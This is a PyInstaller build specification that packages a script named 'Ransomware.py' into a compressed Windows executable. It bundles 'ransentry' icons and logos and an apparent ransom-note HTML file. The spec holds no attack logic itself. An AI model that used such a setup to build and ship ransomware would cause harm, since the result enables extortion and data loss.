# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['Ransomware.py'],
    pathex=[],
    binaries=[],
    datas=[('ransentry_icon.ico', '.'), ('ransentry_logo.png', '.'), ('ransentry_logo.jpg', '.'), ('Ransom info.html', '.')],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='Ransomware',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['ransentry_icon.ico'],
)
